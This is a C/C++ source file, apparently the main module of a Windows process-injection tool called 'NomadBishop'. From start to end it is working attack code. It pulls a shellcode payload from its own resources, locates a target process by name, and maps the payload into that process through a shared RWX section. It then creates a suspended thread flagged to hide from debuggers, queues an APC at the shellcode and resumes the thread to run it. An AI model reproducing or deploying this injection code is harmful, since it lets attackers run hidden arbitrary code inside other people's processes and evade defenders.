#include "NomadBishop.h"
#include <stdio.h>

// Entrypoint
int wmain(int argc, wchar_t** argv)
{
    // Initialize pointer to payload
    LPVOID payload = NULL;

    // Initialize variable for size of the payload, set by GetPayload
    DWORD payloadSize = 0;

    // Locate payload in the resource header and get a pointer to it, along with the size
    if ((payload = GetPayload(&payloadSize)))
    {
        printf("[+] Located payload: %lu bytes at 0x%p\n", payloadSize, payload);

        // Initialize variable for target PID
        DWORD pid = 0;

        // Get PID for target process
        if ((pid = GetPID(argv[1])))
        {
            printf("[+] Located target PID: %lu\n", pid);

            // Perform the injection procedure
            if (Bishop(pid, payload, payloadSize))
            {
                // Signal success and return
                printf("[+] Payload successfully injected into PID %i\n", pid);
                return 0;
            }
            // Injection failed
            else printf("[!] Failed to inject payload into PID %i\n", pid);
        }
        else printf("[!] Failed to locate PID for process named %S\n", argv[1]);
    }
    else printf("[!] Failed to locate payload in resource header\n");

    return 1;
}

// Function:    GetPayload
// Description: Locate payload in PE resources section
// Arguments:   (out) Size of the payload
// Returns:     Pointer to the payload
LPVOID GetPayload(PDWORD size)
{
    // Initialize handle to the payload resource
    HRSRC resource = NULL;
    
    // Get handle to the payload resource
    if ((resource = FindResource(NULL, MAKEINTRESOURCE(RID), L"BINARY")))
    {
        // Get size of the payload
        *size = SizeofResource(NULL, resource);

        // Initialize pointer to payload
        LPVOID payload = NULL;

        // Get pointer to the payload
        if ((payload = LockResource(LoadResource(NULL, resource))))
            return payload;
    }

    return NULL;
}

// Function:    GetPID
// Description: Find the PID for a process specified by name
// Arguments:   Pointer to wide char array containing the process name
// Returns:     PID of the specified process, 0 if not found
DWORD GetPID(LPWSTR processName)
{
    // NTDLL handle for resolving RTL functions
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");

    // Resolve RTL function addresses
    fnRtlInitUnicodeString RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    fnRtlEqualUnicodeString RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");

    // Initialize PID to return
    DWORD pid = 0;

    if (RtlInitUnicodeString && RtlEqualUnicodeString)
    {
        // Initialize variable for size of process info buffer, set by NtQuerySystemInformation
        ULONG processInfoSize = 0;

        // Get amount of memory needed for the process table
        // Expecting specific STATUS_INFO_LENGTH_MISMATCH status, processInfoSize is populated with the amount of memory needed.
        if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &processInfoSize) == 0xC0000004)
        {
            // Get handle to the heap
            HANDLE heap = GetProcessHeap();

            // Initialize buffer for process info
            LPVOID processInfoBuffer = NULL;

            // Allocate memory for process info table
            if ((processInfoBuffer = HeapAlloc(heap, HEAP_ZERO_MEMORY, processInfoSize)))
            {
                // Get process information
                if (NtQuerySystemInformation(SystemProcessInformation, processInfoBuffer, processInfoSize, &processInfoSize) == 0)
                {
                    // Struct pointer for process info
                    PSYSTEM_PROCESSES processInfo = (PSYSTEM_PROCESSES)processInfoBuffer;

                    // Create unicode string from wide char array
                    UNICODE_STRING usProcessName;
                    RtlInitUnicodeString(&usProcessName, processName);

                    // Loop through processes and compare against the provided name
                    while (processInfo->NextEntryDelta != 0) {
                        if (RtlEqualUnicodeString(&processInfo->ProcessName, &usProcessName, TRUE)) {
                            // Located the process
                            pid = HandleToULong(processInfo->ProcessId);
                            break;
                        }
                        // Move pointer to next entry
                        processInfo = (PSYSTEM_PROCESSES)(((LPBYTE)processInfo) + processInfo->NextEntryDelta);
                    }
                }
                else printf("[!] Failed to query process info table\n");

                // Free process info buffer
                HeapFree(heap, NULL, processInfoBuffer);
            }
            else printf("[!] Failed to allocate memory for process info table\n");

            // Close heap handle
            NtClose(heap);
        }
        else printf("[!] Failed to determine amount of memory needed for process info table\n");
    }
    else printf("[!] Failed to resolve RTL unicode string functions?\n");

    // Return 0 or the target PID if located
    return pid;
}

// Function:    Bishop
// Description: Perform the injection procedure
// Arguments:   Target PID, pointer to payload, and payload size
// Returns:     TRUE if successful, FALSE otherwise
BOOL Bishop(DWORD pid, LPVOID payload, DWORD payloadSize)
{
    // Status of the injection procedure
    BOOL status = FALSE;

    // Initialize remote process handle
    HANDLE remoteProcess = NULL;

    //
    // Step 1: Get handle to the target process
    //
    if ((remoteProcess = OpenTarget(pid)))
    {
        printf("[+] Process handle: 0x%p\n", remoteProcess);

        // Initialize section handle
        HANDLE section = NULL;

        //
        // Step 2: Create RWX section in memory for the payload
        //
        if ((section = CreateSection(payloadSize)))
        {
            printf("[+] Section handle: 0x%p\n", section);

            // Initialize local process handle
            HANDLE localProcess = GetCurrentProcess();

            // Initialize local view address
            LPVOID localView = NULL;

            //
            // Step 3: Map RW view of section in local process
            //
            if ((localView = MapView(section, localProcess, payloadSize, PAGE_READWRITE)))
            {
                printf("[+] Local view: 0x%p\n", localView);

                // Initialize remote view address
                LPVOID remoteView = NULL;

                //
                // Step 4: Map RX view of section in target process
                //
                if ((remoteView = MapView(section, remoteProcess, payloadSize, PAGE_EXECUTE_READ)))
                {
                    printf("[+] Remote view: 0x%p\n", remoteView);

                    // Initialize number of bytes copied to section
                    SIZE_T bytesCopied = 0;

                    //
                    // Step 5: Copy payload to the section using the local view
                    //
                    if ((bytesCopied = CopyPayload(localProcess, localView, payload, payloadSize)))
                    {
                        printf("[+] Copied %zu bytes to section\n", bytesCopied);

                        // Initialize thread handle
                        HANDLE thread = NULL;

                        //
                        // Step 6: Create suspended thread in target process at RtlExitUserThread
                        //
                        if ((thread = InjectThread(remoteProcess)))
                        {
                            printf("[+] Thread handle: 0x%p\n", thread);
                            printf("[+] Thread ID: %lu\n", GetThreadId(thread));

                            //
                            // Step 7: Queue APC for thread that points to remote section view (i.e. payload)
                            //
                            if (QueueApc(thread, remoteView))
                            {
                                printf("[+] Queued APC at remote view (0x%p)\n", remoteView);

                                //
                                // Step 8: Reanimate suspended thread, triggering the APC (i.e. payload)
                                //
                                if (WakeThread(thread))
                                    // Signal success
                                    status = TRUE;
                            }
                            // Close thread handle
                            NtClose(thread);
                        }
                    }
                    // To avoid crashing the target process, only unmap the remote view when injection fails
                    if (!status) NtUnmapViewOfSection(remoteProcess, remoteView);
                }
                // Unmap local view
                NtUnmapViewOfSection(localProcess, localView);
            }
            // Close section and local process handle
            NtClose(section);
            NtClose(localProcess);
        }
        // Close remote process handle
        NtClose(remoteProcess);
    }

    return status;
}

// Function:    OpenTarget
// Description: Open a target process
// Arguments:   Target process ID
// Returns:     Handle to the process, NULL on failure
HANDLE OpenTarget(int pid)
{
    // Handle to the target process, set by NtOpenProcess
    HANDLE handle = NULL;

    // Client ID struct, populate with target PID
    CLIENT_ID cid{};
    cid.UniqueProcess = ULongToHandle(pid);
    cid.UniqueThread = NULL;

    // Empty object attributes struct
    OBJECT_ATTRIBUTES oa{};
    SecureZeroMemory(&oa, sizeof(oa));
    oa.Length = sizeof(oa);

    // Open a handle to the target process
    // Note: PROCESS_QUERY_LIMITED_INFORMATION only necessary for x86 compatibility
    NTSTATUS status = NtOpenProcess(&handle,
                                    PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_QUERY_LIMITED_INFORMATION,
                                    &oa, &cid);

    if (status == 0)
        // Successfully opened process, return the handle
        return handle;
    else if (status == 0xC0000022)
        // Access denied
        printf("[!] NtOpenProcess failed: 0x%X (Access to the target process denied)\n", status);
    else
        // Some other error occurred
        printf("[!] NtOpenProcess failed: 0x%X\n", status);

    return NULL;
}

// Function:    CreateSection
// Description: Create a RWX memory section
// Arguments:   Size of the section to create
// Returns:     Handle to the section, NULL on failure
HANDLE CreateSection(DWORD size)
{
    // Handle to the created section, set by NtCreateSection
    HANDLE handle = NULL;

    // Maximum size of the section
    LARGE_INTEGER maxSize = { size };

    // Create the section
    NTSTATUS status = NtCreateSection(&handle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
                                        &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (status == 0)
        // Successfully created section, return the handle
        return handle;

    // Failed to create section
    printf("[!] NtCreateSection failed: 0x%X (Size: %i)\n", status, size);

    return NULL;
}

// Function:    MapView
// Description: Map a view to a section
// Arguments:   Handle to the section
//              Handle to the process where the view will be mapped
//              Payload size
//              Memory protection settings
// Returns:     Address of the view if mapped successfully, NULL otherwise
LPVOID MapView(HANDLE section, HANDLE process, int size, ULONG protection)
{
    // Address of the mapped view, set by NtMapViewOfSection
    LPVOID address = NULL;

    // Size of the view
    SIZE_T viewSize = size;

    // Map view of the specified section in the specified process
    NTSTATUS status = NtMapViewOfSection(section, process, &address, 0, 0,
                                        NULL, &viewSize, ViewUnmap, 0, protection);

    if (status == 0)
        // Successfully mapped view of section, return the address
        return address;

    // Failed to map view of section
    printf("[!] NtMapViewOfSection failed: 0x%X (Section: 0x%p, Process: 0x%p, Protection: %lu)\n",
            status, section, process, protection);

    return NULL;
}

// Function:    CopyPayload
// Description: Write payload to a memory destination
// Arguments:   Handle to process where the memory resides
//              Pointer to the memory destination
//              Pointer to the payload
//              Payload size
// Returns:     Bytes copied (0 on failure)
SIZE_T CopyPayload(HANDLE process, LPVOID destination, LPVOID source, int size)
{
    // Bytes written by NtWriteVirtualMemory
    SIZE_T bytesCopied = 0;

    // Write the payload to the destination
    NTSTATUS status = NtWriteVirtualMemory(process, destination, source, size, &bytesCopied);

    if (status == 0)
        // Successfully copied payload to destination, return the number of bytes copied
        return bytesCopied;

    // Failed to copy payload to destination
    printf("[!] NtWriteVirtualMemory failed: 0x%X (Process: 0x%p, Dest: 0x%p, Src: 0x%p, Size: %i)\n",
            status, process, destination, source, size);

    return 0;
}

// Function:    InjectThread
// Description: Create a suspended thread in a target process at RtlExitUserThread
// Arguments:   Handle to the target process
// Returns:     Handle to the thread, NULL on failure
HANDLE InjectThread(HANDLE process)
{
    // Handle for the thread, set by NtCreateThreadEx
    HANDLE handle = NULL;

    // NTDLL handle for calculating remote thread offset
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");

    // Get RtlExitUserThread function address
    LPVOID funcAddress = GetProcAddress(ntdll, "RtlExitUserThread");

    // Calculate thread start offset in remote process
    LPVOID startAddress = ntdll + (UINT_PTR)funcAddress;

    // Create suspended thread in target process
    NTSTATUS status = NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, NULL, process,
                                        (LPTHREAD_START_ROUTINE)startAddress, NULL,
                                        THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                                        0, 0, 0, NULL);

    if (status == 0)
        // Successfully created thread, return the handle
        return handle;

    // Failed to create thread
    printf("[!] NtCreateThreadEx failed: 0x%X (Process: 0x%p, Address: 0x%p)\n",
            status, process, startAddress);

    return NULL;
}

// Function:    QueueApc
// Description: Queue an APC on a target thread
// Arguments:   Target thread handle
//              APC address (i.e. shellcode)
// Returns:     True if successful, false otherwise
BOOL QueueApc(HANDLE thread, LPVOID address)
{
    // Queue APC at specified address on target thread
    NTSTATUS status = NtQueueApcThread(thread, (PKNORMAL_ROUTINE)address, NULL, NULL, NULL);

    if (status == 0)
        // Successfully queued APC on target thread
        return TRUE;

    // Failed to queue APC
    printf("[!] NtQueueApcThread failed: 0x%X (Thread: 0x%p, Address: 0x%p)\n",
            status, thread, address);

    return FALSE;
}

// Function:    WakeThread
// Description: Resume a suspended thread
// Arguments:   Handle to the thread
// Returns:     True if successful, false otherwise
BOOL WakeThread(HANDLE thread)
{
    // Thead suspend count, set by NtAlertResumeThread
    DWORD suspendCount = 0;

    // Resume target thread, triggering queued APCs
    NTSTATUS status = NtAlertResumeThread(thread, &suspendCount);

    if (status == 0)
        // Successfuly resumed thread
        return TRUE;

    // Failed to resume thread
    printf("[!] NtAlertResumeThread failed: 0x%X (Thread: 0x%p)\n",
            status, thread);

    return FALSE;
}
